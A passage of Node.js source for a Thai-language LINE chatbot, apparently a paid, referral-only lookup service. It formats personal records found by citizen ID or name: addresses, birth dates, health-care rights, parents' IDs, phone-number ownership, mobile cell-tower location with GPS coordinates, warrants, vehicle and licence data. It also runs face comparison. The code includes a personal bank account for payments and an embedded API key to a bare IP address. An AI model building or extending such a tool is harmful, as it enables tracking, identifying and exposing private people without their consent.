        layout: 'vertical',
        backgroundColor: '#0B0F14',
        paddingAll: '16px',
        spacing: 'sm',

        contents: [

          {
            type: 'button',
            style: 'primary',
            color: '#2563EB',
            height: 'sm',

            action: {
              type: 'message',
              label: 'รับทราบกฏของระบบ',
              text: 'รับทราบกฏของระบบ'
            }
          },

          {
            type: 'button',
            style: 'secondary',
            height: 'sm',

            action: {
              type: 'message',
              label: 'รายการใช้งานในระบบ',
              text: 'menu%'
            }
          },

          {
            type: 'button',
            style: 'secondary',
            height: 'sm',

            action: {
              type: 'uri',
              label: 'ติดต่อ ADMIN',
              uri: 'https://line.me/ti/p/mVmD-ncfvU'
            }
          }

        ]
      }
    }
  };
}

function buildAcknowledgeRulesFlex() {
  return {
    type: 'flex',

    altText:
      'รับทราบกฏของระบบ',

    contents: {
      type: 'bubble',
      size: 'mega',

      body: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0B0F14',
        paddingAll: '20px',
        spacing: 'md',

        contents: [

          {
            type: 'text',
            text: '✅ รับทราบกฏของระบบ',
            weight: 'bold',
            size: 'xl',
            color: '#22C55E',
            align: 'center',
            wrap: true
          },

          {
            type: 'separator',
            color: '#334155',
            margin: 'md'
          },

          {
            type: 'text',
            text:
              'ก่อนลงทะเบียน กรุณาตรวจสอบข้อมูลของท่านให้ถูกต้องและเป็นความจริง',
            color: '#FFFFFF',
            size: 'sm',
            wrap: true,
            margin: 'md'
          },

          {
            type: 'text',
            text:
              'ผู้สมัครใหม่ต้องมีผู้แนะนำ และผู้แนะนำต้องเป็นสมาชิกปัจจุบันของระบบ',
            color: '#CBD5E1',
            size: 'sm',
            wrap: true
          },

          {
            type: 'text',
            text:
              'ห้ามแอบอ้างบุคคลอื่น หรือใช้ข้อมูลอันเป็นเท็จในการสมัคร',
            color: '#FCA5A5',
            size: 'sm',
            wrap: true
          },

          {
            type: 'text',
            text:
              'เมื่อพร้อมแล้ว กดปุ่มด้านล่างเพื่อเข้าสู่หน้าลงทะเบียนยืนยันตัวตน',
            color: '#FDE68A',
            size: 'sm',
            wrap: true,
            margin: 'md',
            align: 'center'
          }

        ]
      },

      footer: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0B0F14',
        paddingAll: '16px',

        contents: [

          {
            type: 'button',
            style: 'primary',
            color: '#22C55E',
            height: 'sm',

            action: {
  type: 'message',

  label:
    'ลงทะเบียนยืนยันตัวตนเพื่อใช้งาน',

  text:
    'regis%'
}
          }

        ]
      }
    }
  };
}

function buildSupportFlex() {
  return {
    type: 'flex',
    altText: 'ร่วมสนับสนุนเซิร์ฟเวอร์',

    contents: {
      type: 'bubble',
      size: 'mega',

      // =====================================
      // HEADER
      // =====================================
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#142D4E',
        paddingAll: '22px',
        spacing: 'sm',

        contents: [
          {
            type: 'text',
            text: 'ร่วมสนับสนุนเซิร์ฟเวอร์',
            color: '#FFFFFF',
            weight: 'bold',
            size: 'xl',
            align: 'center',
            wrap: true
          },
          {
            type: 'text',
            text: 'เพื่อบำรุงรักษาระบบ',
            color: '#BCD1EA',
            size: 'sm',
            align: 'center'
          }
        ]
      },

      // =====================================
      // BODY
      // =====================================
      body: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '22px',
        spacing: 'lg',

        contents: [

          // =====================================
          // ราคา
          // =====================================
          {
            type: 'text',
            text: 'ระยะเวลาและยอดสนับสนุน',
            weight: 'bold',
            size: 'md',
            color: '#142D4E'
          },

          {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#F2F6FC',
            cornerRadius: '12px',
            paddingAll: '16px',
            spacing: 'md',

            contents: [
              {
                type: 'box',
                layout: 'horizontal',

                contents: [
                  {
                    type: 'text',
                    text: '30 วัน',
                    size: 'md',
                    color: '#334155'
                  },
                  {
                    type: 'text',
                    text: '499 บาท',
                    size: 'md',
                    weight: 'bold',
                    align: 'end',
                    color: '#142D4E'
                  }
                ]
              },

              {
                type: 'separator',
                color: '#DDE5EF'
              },

              {
                type: 'box',
                layout: 'horizontal',

                contents: [
                  {
                    type: 'text',
                    text: '90 วัน',
                    size: 'md',
                    color: '#334155'
                  },
                  {
                    type: 'text',
                    text: '1,299 บาท',
                    size: 'md',
                    weight: 'bold',
                    align: 'end',
                    color: '#142D4E'
                  }
                ]
              },

              {
                type: 'separator',
                color: '#DDE5EF'
              },

              {
                type: 'box',
                layout: 'horizontal',

                contents: [
                  {
                    type: 'text',
                    text: '180 วัน',
                    size: 'md',
                    color: '#334155'
                  },
                  {
                    type: 'text',
                    text: '2,299 บาท',
                    size: 'md',
                    weight: 'bold',
                    align: 'end',
                    color: '#142D4E'
                  }
                ]
              },

              {
                type: 'separator',
                color: '#DDE5EF'
              },

              {
                type: 'box',
                layout: 'horizontal',

                contents: [
                  {
                    type: 'text',
                    text: '365 วัน',
                    size: 'md',
                    color: '#334155'
                  },
                  {
                    type: 'text',
                    text: '4,299 บาท',
                    size: 'md',
                    weight: 'bold',
                    align: 'end',
                    color: '#142D4E'
                  }
                ]
              }
            ]
          },

          // =====================================
          // บัญชีสนับสนุน
          // =====================================
          {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#ECFDF5',
            cornerRadius: '12px',
            paddingAll: '16px',
            spacing: 'sm',

            contents: [
              {
                type: 'text',
                text: " บัญชีสำหรับร่วมสนับสนุน",
                weight: 'bold',
                size: 'md',
                color: '#166534',
                wrap: true
              },

              {
                type: 'separator',
                color: '#BBF7D0',
                margin: 'sm'
              },

              {
                type: 'text',
                text: 'ธนาคารกสิกรไทย',
                size: 'sm',
                color: '#475569',
                margin: 'sm'
              },

              {
                type: 'text',
                text: '223-8-45775-3',
                size: 'xl',
                weight: 'bold',
                color: '#142D4E',
                margin: 'sm',
                align: 'center'
              },

              {
                type: 'text',
                text: 'ชื่อบัญชี : TATTHEP KONGTHUP',
                size: 'sm',
                weight: 'bold',
                color: '#334155',
                wrap: true,
                margin: 'sm',
                align: 'center'
              }
            ]
          },

          // =====================================
          // ข้อควรทราบ
          // =====================================
          {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#FFF5E6',
            cornerRadius: '12px',
            paddingAll: '16px',
            spacing: 'sm',

            contents: [
              {
                type: 'text',
                text: '⚠️ ข้อควรทราบ',
                weight: 'bold',
                size: 'sm',
                color: '#A65D00'
              },

              {
                type: 'text',
                text: 'ชื่อผู้โอนสนับสนุนต้องตรงกับชื่อผู้สมัครเท่านั้น',
                size: 'sm',
                weight: 'bold',
                color: '#92400E',
                wrap: true
              },

              {
                type: 'text',
                text: 'เพื่อการตรวจสอบที่รวดเร็ว',
                size: 'sm',
                color: '#A66B2B',
                wrap: true
              }
            ]
          },

          {
            type: 'separator',
            color: '#E2E8F0'
          },

          {
            type: 'text',
            text: 'ขอบคุณทุกท่านที่ร่วมสนับสนุนครับ',
            size: 'sm',
            color: '#64748B',
            align: 'center',
            wrap: true
          }
        ]
      },

      // =====================================
      // FOOTER
      // =====================================
      footer: {
        type: 'box',
        layout: 'vertical',
        paddingTop: '0px',
        paddingBottom: '22px',
        paddingStart: '22px',
        paddingEnd: '22px',

        contents: [
          {
            type: 'button',
            style: 'primary',
            color: '#167A64',
            height: 'md',

            action: {
              type: 'message',
              label: 'แจ้งสลิปสนับสนุนระบบ',
              text: 'แจ้งสลิปสนับสนุน'
            }
          }
        ]
      }
    }
  };
}

async function saveLineImage(messageId, filePath) {
  const token = process.env.CHANNEL_ACCESS_TOKEN;

  const res = await axios.get(
    `https://api-data.line.me/v2/bot/message/${messageId}/content`,
    {
      responseType: 'stream',
      headers: {
        Authorization: `Bearer ${token}`
      }
    }
  );

  const writer = fs.createWriteStream(filePath);

  return new Promise((resolve, reject) => {
    res.data.pipe(writer);
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}

async function compareFaces(image1Path, image2Path) {
  const formData = new FormData();
  formData.append('file1', fs.createReadStream(image1Path));
  formData.append('file2', fs.createReadStream(image2Path));
  formData.append('min_score', '0.8');

  const response = await axios.post(
    'https://api.iapp.co.th/v3/store/ekyc/face-comparison',
    formData,
    {
      headers: {
        apikey: IAPP_API_KEY,
        ...formData.getHeaders()
      }
    }
  );

  return response.data;
}

// ===============================
// สร้างข้อความตอบกลับ dol%
// ===============================
function buildOfficeHourSearchMessage(pid) {
  const now = new Date();

  const dateText = now.toLocaleDateString('en-GB', {
    timeZone: 'Asia/Bangkok',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric'
  }).replace(/\//g, '-');

  const timeText = now.toLocaleTimeString('en-GB', {
    timeZone: 'Asia/Bangkok',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false
  });

  return (
    ` PID : ${pid}\n` +
    `────────────
` +
    `❌ ไม่พบข้อมูล\n` +
    ` กรุณาดำเนินการสืบค้น
` +
    `เฉพาะในช่วงเวลาราชการเท่านั้น\n\n` +
    ` เปิดให้บริการ : 09:00 น.
` +
    ` ปิดให้บริการ : 15:30 น.

` +
    `⚠️ ไม่สามารถสืบค้นนอกช่วงเวลาที่กำหนดได้\n` +
    `────────────
` +
    `วันที่สืบค้น
` +
    `#${dateText} ${timeText} นาที`
  );
}

function formatFaceCompareResult(data) {
  const match = data.status?.match === true;
  const score = data.similarity_score || data.comparison_score || 0;
  const percent = (score * 100).toFixed(2);

  return ` ▸ รายงานเปรียบเทียบใบหน้า
────────────
◇ ผลตรวจพบใบหน้าภาพที่ 1
  ${data.status?.face1_detected ? 'ตรวจพบ' : 'ไม่พบ'}
◇ ผลตรวจพบใบหน้าภาพที่ 2
  ${data.status?.face2_detected ? 'ตรวจพบ' : 'ไม่พบ'}

ผลลัพธ์: ${match ? '✅ ใบหน้ามีความคล้ายกัน' : '❌ ใบหน้าไม่ตรงกัน'}
◇ คะแนนความคล้ายของใบหน้า
  ${score}
คิดเป็น: ${percent}%

◇ ระยะเวลาประมวลผล
  ${data.process_time || '-'} วินาที`;
}

function formatPhoneData(raw) {
  const mainId = raw.match(/📂\[\s*(.*?)\s*\]/)?.[1]?.trim() || '-';
  const name = raw.match(/👤\s*ชื่อ:\s*(.*)/)?.[1]?.trim() || 'ไม่มีข้อมูล';
  const id = raw.match(/🪪\s*ID:\s*(.*)/)?.[1]?.trim() || mainId;

  const blocks = String(raw)
    .split(/(?=ข้อมูล:\s*\[)/g)
    .filter(x => /ข้อมูล:\s*\[/.test(x));

  if (!blocks.length) return '❌ ไม่พบข้อมูลเบอร์โทรศัพท์';

  const items = blocks.map((block, index) => {
    const phone = block.match(/ข้อมูล:\s*\[\s*(.*?)\s*\]/)?.[1]?.trim() || '-';
    const packageName = block.match(/ข้อมูล:\s*\[.*?\]\s*\[(.*?)\]/)?.[1]?.trim() || '';
    const ownerLine = block.match(/\((.*?)\)\s*\[(.*?)\]/);
    const ownerName = ownerLine?.[1]?.trim() || '';
    const ownerId = ownerLine?.[2]?.trim() || packageName || '';

    const type = block.match(/ประเภท:\s*(.*)/)?.[1]?.trim() || '-';
    const startDate = block.match(/เริ่มใช้งาน:\s*(.*)/)?.[1]?.trim() || '-';
    const endDate = block.match(/สิ้นสุด:\s*(.*)/)?.[1]?.trim() || '-';
    const product = block.match(/ผลิตภัณฑ์:\s*(.*)/)?.[1]?.trim() || '';
    const status = block.match(/สถานะ:\s*(.*)/)?.[1]?.trim() || '-';

    let text = `ข้อมูลเบอร์โทรศัพท์ รายการที่ ${index + 1}
• หมายเลข: ${phone}`;

    if (ownerName) text += `
◇ ชื่อที่แสดงในรายการ
  ${ownerName}`;
    if (ownerId) text += `
• ID/แพ็กเกจ: ${ownerId}`;

    text += `
• ประเภท: ${type}
• วันจดทะเบียน: ${startDate}
• วันสิ้นสุด: ${endDate}`;

    if (product) text += `
• ผลิตภัณฑ์: ${product}`;

    text += `
• สถานะ: ${status}`;

    return text;
  });

  return `[ ${mainId} ]

────────────

▸ รายละเอียดเจ้าของหมายเลข
• NAME: ${name}
• ID: ${id}

────────────

${items.join("\n\n────────────\n\n")}

────────────`;
}

async function handleEvent(event) {
  const recipient = event.source?.groupId || event.source?.roomId || event.source?.userId;
  if (event.replyToken && recipient) NECT_REPLY_RECIPIENTS.set(event.replyToken, recipient);
  try {
  const db = loadDB();

if (event.type === 'follow') {
    return reply(event.replyToken, buildWelcomeWarningFlex());
  }

  const eventId = event.webhookEventId;
  if (eventId && isEventProcessed(db, eventId)) {
    return null;
  }

  if (eventId) {
    markEventProcessed(db, eventId);
    saveDB(db);
  }

  if (event.type === 'postback') {
    return await handlePostback(event);
  }

  if (event.type !== 'message') {
    return null;
  }

  if (event.message.type === 'text') {
    return await handleText(event);
  }

  if (event.message.type === 'image') {
    return await handleImage(event);
  }

  return null;

  } finally {
    if (event.replyToken) NECT_REPLY_RECIPIENTS.delete(event.replyToken);
  }
}

function buildPendingMembersFlex(db) {
  const pending = Object.entries(db.members || {})
    .filter(([uid, m]) => m.status === 'pending')
    .slice(0, 10);

  if (!pending.length) {
    return {
      type: 'text',
      text: '✅ ไม่มีสมาชิกรอตรวจสอบ'
    };
  }

  return {
    type: 'flex',
    altText: 'สมาชิกรอตรวจสอบ',
    contents: {
      type: 'carousel',
      contents: pending.map(([uid, m], index) => ({
        type: 'bubble',
        size: 'mega',
        body: {
          type: 'box',
          layout: 'vertical',
          spacing: 'sm',
          contents: [
            {
              type: 'text',
              text: `สมาชิกที่ ${index + 1}`,
              weight: 'bold',
              size: 'lg'
            },
     {
  type: 'text',
  text: `ชื่อ: ${m.lineName || m.displayName || m.name || m.fullName || '-'}`,
  wrap: true
},
            {
              type: 'text',
              text: `เบอร์: ${m.phone || m.tel || '-'}`,
              wrap: true
            },
            {
              type: 'text',
              text: `สมัครเมื่อ: ${m.createdAt || m.registeredAt || '-'}`,
              wrap: true
            }
          ]
        },
        footer: {
          type: 'box',
          layout: 'vertical',
          spacing: 'sm',
          contents: [
            {
              type: 'button',
              style: 'primary',
              color: '#22C55E',
              action: {
                type: 'postback',
                label: '✅ อนุมัติ',
                data: `approve_member:${uid}`
              }
            }
          ]
        }
      }))
    }
  };
}

function encodePLMN(mcc, mnc) {
  mcc = String(mcc || '').replace(/\D/g, '');
  mnc = String(mnc || '').replace(/\D/g, '');

  if (mcc.length !== 3) return '-';
  if (mnc.length === 1) mnc = '0' + mnc;

  const mcc1 = mcc[0];
  const mcc2 = mcc[1];
  const mcc3 = mcc[2];

  const mnc1 = mnc[0];
  const mnc2 = mnc[1];
  const mnc3 = mnc.length === 3 ? mnc[2] : 'f';

  return `${mcc2}${mcc1}${mnc3}${mcc3}${mnc2}${mnc1}`.toLowerCase();
}

function toHex4(num) {
  const n = parseInt(String(num || '').replace(/\D/g, ''), 10);
  if (Number.isNaN(n)) return '0000';
  return n.toString(16).padStart(4, '0');
}

function getProviderName(mnc) {
  const n = String(mnc || '').replace(/\D/g, '');
  if (n === '4' || n === '04') return 'Truemove (4)';
  if (n === '3' || n === '03') return 'AIS (3)';
  if (n === '5' || n === '05') return 'DTAC (5)';
  return `Unknown (${mnc || '-'})`;
}

function getField(raw, label) {
  const re = new RegExp(`^${label}\\s*(.*)$`, 'im');
  return raw.match(re)?.[1]?.trim() || '-';
}

function formatBCell(raw) {
  const location = getField(raw, 'Location');
  const receivedAt = getField(raw, 'Received at');
  const gps = getField(raw, 'GPS');
  const cid = getField(raw, 'CID');
  const lac = getField(raw, 'LAC');
  const plmn = getField(raw, 'PLMN');
  const msisdn = getField(raw, 'MSISDN');
  const deviceStatus = getField(raw, 'Device status');
  const recency = getField(raw, 'Recency');
  const received = getField(raw, 'Received');
  const type = getField(raw, 'Type');

  const [mcc, mnc] = plmn.split(/\s+/);
  const cgi = `${encodePLMN(mcc, mnc)}${toHex4(lac)}${toHex4(cid)}`;

  const provider = getProviderName(mnc);

  return `Location
${location}
Received at ${receivedAt}
GPS ${gps}
CID ${cid}
LAC ${lac}
CGI ${cgi}
PLMN ${plmn}
MSISDN ${msisdn}
Device status ${deviceStatus}
Recency ${recency}
Recieved ${received}
Type ${type}
Home Country (MCC) Thailand (${mcc})
Home Provider (MNC) ${provider}
Host Country (MCC) Thailand (${mcc})
Host Provider (MNC) ${provider}`;
}

async function askLaw(query){

  try{

    const {data} =
    await axios.post(
      'https://api.iapp.co.th/thanoy',
      {
        query
      },
      {
        headers:{
          apikey:IAPP_API_KEY,
          'Content-Type':'application/json'
        },
        timeout:60000
      }
    );

    return data;

  }catch(err){

    console.log(
      'law error:',
      err.response?.data ||
      err.message
    );

    return null;
  }
}

function findMemberByPhone(db, phone) {
  const cleanPhone = String(phone || '').replace(/\D/g, '');

  const found = Object.entries(db.members || {}).find(([uid, member]) => {
    const memberPhone = String(
      member.phone || member.tel || member.mobile || ''
    ).replace(/\D/g, '');

    return memberPhone === cleanPhone;
  });

  if (!found) return null;

  return {
    userId: found[0],
    member: found[1]
  };
}

function summarizeDL(data){
const rows = data?.content || [];

if(!rows.length) return '❌ไม่พบข้อมูลใบขับขี่';

let msg = `▸ รายละเอียดใบอนุญาตขับขี่
`;

rows.slice(0,2).forEach((license,idx)=>{
msg += `
ใบขับขี่ที่${idx+1}
ประเภทใบขับขี่: ${license.type || '-'}
 เลขที่ใบขับขี่: ${license.licenseNumber || '-'}
 วันที่ออกใบอนุญาต: ${license.licenseIssueDate ? new Date(license.licenseIssueDate).toLocaleDateString('th-TH') : '-'}
◇ วันที่สิ้นอายุ
  ${license.licenseExpirationDate ? new Date(license.licenseExpirationDate).toLocaleDateString('th-TH') : '-'}`;
});

return msg.trim();
}

function summarizeVehicleCID(res){
const rows = Array.isArray(res?.data)
? res.data
: Array.isArray(res?.data?.content)
? res.data.content
: Array.isArray(res?.content)
? res.content
: [];

if(!rows.length) return '❌ไม่พบข้อมูลทะเบียนรถ';

let msg = `ข้อมูลครอบครองรถ
`;

rows.slice(0,1).forEach((car,index)=>{
msg += `
• คันที่${index+1}
◇ หมายเลขทะเบียน
  ${safeVehicleValue(car?.plate1,'')}${safeVehicleValue(car?.plate2,'')}
◇ สำนักงานที่ระบุ
  ${safeVehicleValue(car?.offLocDesc)}
◇ ยี่ห้อที่ระบุ
  ${safeVehicleValue(car?.brnDesc)}
◇ รุ่นที่ระบุ
  ${safeVehicleValue(car?.modelName)}
◇ สีที่ระบุ
  ${getVehicleColor(car)}
◇ ประเภทของรถ
  ${safeVehicleValue(car?.vehTypeDesc)}
◇ ลักษณะของรถ
  ${safeVehicleValue(car?.kindDesc)}
◇ วันจดทะเบียน
  ${formatThaiDateOnly(car?.regDate)}
◇ วันที่สิ้นอายุ
  ${formatThaiDateOnly(car?.expDate)}`;
});

return msg.trim();
}

function fieldText(label, value) {
  return {
    type: 'box', layout: 'vertical', spacing: 'xs',
    backgroundColor: '#F1F5FB', cornerRadius: '10px', paddingAll: '10px',
    contents: [
      { type: 'text', text: String(label), size: 'xs', color: '#52677D', wrap: true },
      { type: 'text', text: String(value || '-'), size: 'sm', color: '#172B4D', weight: 'bold', wrap: true }
    ]
  };
}

function parseCrimeText(raw){
const s = String(raw || '');

function pick(label){
const m = s.match(new RegExp(label + '\\s*:\\s*([^\\n]+)', 'i'));
return m ? m[1].trim() : '-';
}

return {
warrant: pick('WARRENT'),
caseNo: pick('CRIMES'),
charge: pick('CHARGE'),
id: pick('ID'),
name: pick('FULLNAME'),
police: pick('POLICE'),
tel: pick('TELL'),
status: pick('STATUS')
};
}

function buildCrimeFlex(result, citizenId) {
  const rows =
    Array.isArray(result?.data)
      ? result.data
      : Array.isArray(result?.data?.data)
        ? result.data.data
        : Array.isArray(result?.content)
          ? result.content
          : [];

  if (!rows.length) {
    return {
      type: 'text',
      text: '❌ ไม่พบข้อมูลหมายจับ'
    };
  }

  const bubbles = rows.slice(0, 10).map((raw, index) => {
    const item = parseCrimeText(raw);

    // เก็บเฉพาะตัวเลขสำหรับใช้โทรออก
    const phone = String(item.tel || '').replace(/\D/g, '');

    const footerContents = [];

    // แสดงปุ่มโทรเฉพาะเมื่อมีหมายเลขที่ใช้งานได้
    if (phone) {
      footerContents.push({
        type: 'button',
        style: 'primary',
        color: '#DC2626',
        height: 'sm',
        action: {
          type: 'uri',
          label: " โทรหาเจ้าของคดี",
          uri: `tel:${phone}`
        }
      });
    }

    footerContents.push({
      type: 'text',
      text: `รายการ ${index + 1} จาก ${rows.length}`,
      size: 'xs',
      align: 'center',
      color: '#6B7280',
      margin: phone ? 'md' : 'none'
    });

    return {
      type: 'bubble',
      size: 'mega',
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#7F1D1D',
        paddingAll: '16px',
        contents: [
          {
            type: 'text',
            text: ` หมายจับ [CRIME] ${index + 1}`,
            weight: 'bold',
            size: 'lg',
            color: '#FFFFFF'
          },
          {
            type: 'text',
            text:
              item.status ||
              item.warrantStatus ||
              'ตรวจพบข้อมูล',
            size: 'sm',
            color: '#FECACA',
            margin: 'sm',
            wrap: true
          }
        ]
      },
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
            type: 'text',
            text: item.name || '-',
            weight: 'bold',
            size: 'md',
            wrap: true,
            color: '#111827'
          },
          {
            type: 'separator',
            margin: 'md'
          },
          fieldText("หมายเลขหมายจับ", item.warrant || '-'),
          fieldText("หมายเลขคดี", item.caseNo || '-'),
          fieldText("หมายเลขบัตร", item.id || citizenId || '-'),
          fieldText("รายการข้อหา", item.charge || '-'),
          fieldText("เจ้าของคดีที่ระบุ", item.police || '-'),
          fieldText("เบอร์สำหรับติดต่อ", item.tel || '-'),
          fieldText("สถานะของหมายจับ", item.status || '-')
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        paddingAll: '14px',
        contents: footerContents
      }
    };
  });

  return {
    type: 'flex',
    altText: `พบข้อมูลหมายจับ ${rows.length} รายการ`,
    contents: {
      type: 'carousel',
      contents: bubbles
    }
  };
}

function calcDistanceKm(lat1, lon1, lat2, lon2) {
  const R = 6371;

  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;

  const a =
    Math.sin(dLat / 2) ** 2 +
    Math.cos(lat1 * Math.PI / 180) *
    Math.cos(lat2 * Math.PI / 180) *
    Math.sin(dLon / 2) ** 2;

  return R * (2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a)));
}

function formatDistanceResult(startLat, startLng, endLat, endLng, distance) {
const mapUrl = `https://www.google.com/maps/dir/${startLat},${startLng}/${endLat},${endLng}`;

return ` ▸ สรุปพิกัดและระยะห่างแนวเส้นตรง
────────────

 พิกัดต้นทาง
 ${startLat}, ${startLng}

 พิกัดปลายทาง
 ${endLat}, ${endLng}

 ระยะทางเส้นตรง (Straight Line Distance)
 ${distance} กิโลเมตร

 สรุปการเคลื่อนที่
ต้นทาง → ${startLat}, ${startLng}
ปลายทาง → ${endLat}, ${endLng}
ระยะห่างเชิงเส้นตรง → ${distance} กม.

 Google Maps
${mapUrl}

────────────

◇ หมายเหตุประกอบรายการ
  ระยะทางดังกล่าวเป็นระยะทางเส้นตรงจากพิกัดถึงพิกัด (Air Distance) ไม่ใช่ระยะทางตามเส้นทางถนนจริง`;
}

function formatPiPidResult(data){

if(!data || data.ok !== true){
return '❌ไม่พบข้อมูล';
}

return `▸ รายละเอียดของบุคคล
◇ ชื่อและนามสกุล
  ${data.name || '-'}
◇ หมายเลขประจำตัวประชาชน
  ${data.pid || '-'}
• เพศ: ${data.sex || '-'}
◇ วันเดือนปีเกิด
  ${formatThaiDateOnlyText(data.dob)}

• ที่อยู่ตามทะเบียนราษฎร
• ${data.address || '-'}

• สิทธิการรักษา
◇ ชื่อหน่วยบริการประจำ
  ${data.hospital || '-'}
• สิทธิ: ${data.right || '-'}

• ข้อมูลบิดา-มารดา
• บิดา: ${data.father_id || '-'}
• มารดา: ${data.mother_id || '-'}`;
}

function formatPiNameResult(data){

if(!data || data.ok !== true || !Array.isArray(data.results) || !data.results.length){
return '❌ไม่พบข้อมูล';
}

let msg = ` ▸ รายงานผลค้นหาบุคคล
 พบข้อมูลทั้งหมด ${data.count || data.results.length} รายการ
────────────`;

data.results.forEach((item,index)=>{

msg += `

• รายการที่ ${index+1}
◇ ชื่อและนามสกุล
  ${item.name || '-'}
◇ หมายเลขบัตร
  ${item.pid || '-'}
◇ วันเดือนปีเกิด
  ${formatThaiDateOnlyText(item.dob)}
◇ จังหวัดที่ระบุ
  ${item.province || '-'}
• สิทธิ: ${item.right || '-'}`;

});

return msg;
}

function formatThaiDateOnlyText(dateStr){

if(!dateStr) return '-';

const months = [
'มกราคม','กุมภาพันธ์','มีนาคม','เมษายน',
'พฤษภาคม','มิถุนายน','กรกฎาคม','สิงหาคม',
'กันยายน','ตุลาคม','พฤศจิกายน','ธันวาคม'
];

const d = new Date(dateStr);

if(isNaN(d.getTime())) return dateStr;

return `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()+543}`;
}

function createCCTVFlex(cameraTime, realTime, diff) {
return {
type: 'flex',
altText: 'ผลการคำนวณเวลา CCTV',
contents: {
type: 'bubble',
body: {
type: 'box',
layout: 'vertical',
spacing: 'md',
contents: [
{
type: 'text',
text: " การคำนวณความต่างของเวลา CCTV",
weight: 'bold',
size: 'lg',
wrap: true
},
{
type: 'separator',
margin: 'md'
},
{
type: 'text',
text: ` เวลาในกล้อง : ${cameraTime}`,
wrap: true
},
{
type: 'text',
text: ` เวลาจริง : ${realTime}`,
wrap: true
},
{
type: 'text',
text: " เวลาต่างกัน",
weight: 'bold',
margin: 'md'
},
{
type: 'text',
text: diff,
wrap: true,
weight: 'bold',
color: '#0066CC',
size: 'md'
},
{
type: 'separator',
margin: 'lg'
},
{
type: 'text',
text: '⚠️ หากเวลาข้ามวัน ให้สลับใช้ เวลาจริง,เวลากล้อง',
size: 'xs',
wrap: true,
color: '#FF6B00',
margin: 'md'
}
]
}
}
};
}

function packageBubble(days, price, badgeText = '') {
  const isPopular = badgeText !== '';

  return {
    type: 'bubble',
    size: 'mega',
    hero: {
  type: 'box',
  layout: 'vertical',
  backgroundColor: '#0B0F14',
  paddingAll: '20px',
  contents: [
    {
      type: 'text',
      text: " ธนาคาร : กสิกร",
      color: '#FFFFFF',
      weight: 'bold',
      size: 'md',
      align: 'center'
    },
    {
      type: 'text',
      text: " เลขบัญชี : 2238457753",
      color: '#FFD700',
      weight: 'bold',
      size: 'lg',
      align: 'center',
      margin: 'md'
    }
  ]
},
    body: {
      type: 'box',
      layout: 'vertical',
      backgroundColor: '#0B1F16',
      paddingAll: '20px',
      contents: [
        {
          type: 'text',
          text: isPopular ? badgeText : 'PREMIUM SUPPORT',
          weight: 'bold',
          size: 'xs',
          color: isPopular ? '#FFD700' : '#7CFFB2',
          align: 'center'
        },
        {
          type: 'text',
          text: 'สนับสนุนเซิร์ฟเวอร์',
          weight: 'bold',
          size: 'lg',
          color: '#FFFFFF',
          align: 'center',
          margin: 'md'
        },
        {
          type: 'text',
          text: days,
          weight: 'bold',
          size: '4xl',
          color: '#06C755',
          align: 'center',
          margin: 'lg'
        },
        {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#102E20',
          cornerRadius: 'lg',
          paddingAll: '14px',
          margin: 'md',
          contents: [
            {
              type: 'text',
              text: price,
              weight: 'bold',
              size: 'xxl',
              color: '#FFD700',
              align: 'center'
            }
          ]
        },
        {
          type: 'separator',
          margin: 'xl',
          color: '#2D5A3F'
        },
        {
          type: 'text',
          text: 'ชื่อผู้สนับสนุนต้องตรงกับผู้สมัครเท่านั้น',
          size: 'xs',
          color: '#FFB3B3',
          wrap: true,
          align: 'center',
          margin: 'lg'
        }
      ]
    },
    footer: {
      type: 'box',
      layout: 'vertical',
      backgroundColor: '#0B1F16',
      paddingAll: '16px',
      contents: [
        {
          type: 'button',
          style: 'primary',
          height: 'md',
          color: '#06C755',
          action: {
  type: 'message',
  label: 'แจ้งสลิปสนับสนุน',
  text: 'แจ้งสลิปสนับสนุน'
}
        }
      ]
    },
    styles: {
      hero: {
        backgroundColor: '#FFFFFF'
      },
      body: {
        backgroundColor: '#0B1F16'
      },
      footer: {
        backgroundColor: '#0B1F16'
      }
    }
  };
}

function formatBankBOT(data, keyword) {
  if (!data?.success || !data?.results?.length) {
    return '❌ ไม่พบข้อมูล สืบค้นใหม่อีกครั้ง';
  }

  let msg = `◇ สรุปผลการค้นหา
  ${keyword}\n`;
  msg += `────────────
`;

  data.results.forEach((item, index) => {
    msg += `
รายการ ${index + 1}
◇ ชื่อธนาคาร
  ${item.institutionNameThai || '-'}
◇ รหัสประจำธนาคาร
  ${item.bankCode || '-'}
 สถานะ: ${item.closeDate || '-'}
◇ รายละเอียดที่อยู่
  ${item.institutionAddressThai || '-'}
 โทร: ${item.telephone || '-'}
◇ ที่อยู่เว็บไซต์
  ${item.institutionUrl || '-'}
────────────`;
  });

  return msg.trim();
}

async function searchBankBOT(keyword) {
  const key = String(keyword || '').trim();

  const isBankCode = /^\d{3,4}$/.test(key);
  const searchValue = isBankCode
    ? key.padStart(4, '0')
    : key;

  const encoded = encodeURIComponent(searchValue);

  const url =
    'https://www.bot.or.th/content/bot/th/fi-list/jcr:content/root/container/involvepartyopenlist.InvolvePartyOpenListingResultsBank.10.p0.BANK_CODE.inst0.paysys0.status0.' +
    encoded +
    '.ascending.json';

  const res = await axios.get(url, {
    timeout: 15000,
    headers: {
      'User-Agent': 'Mozilla/5.0',
      'Accept': 'application/json'
    }
  });

  return res.data;
}

async function searchSeven(storeId) {

  const { data } = await axios.get(
    `http://151.246.242.113:2266/?se=${encodeURIComponent(storeId)}&key=qYFlSvOoq0shlfbNWUzLlqZx`,
    {
      timeout: 15000
    }
  );

  if (!data?.success || !data?.data) {
    return '❌ ไม่พบข้อมูลสาขา';
  }

  const shop = data.data;

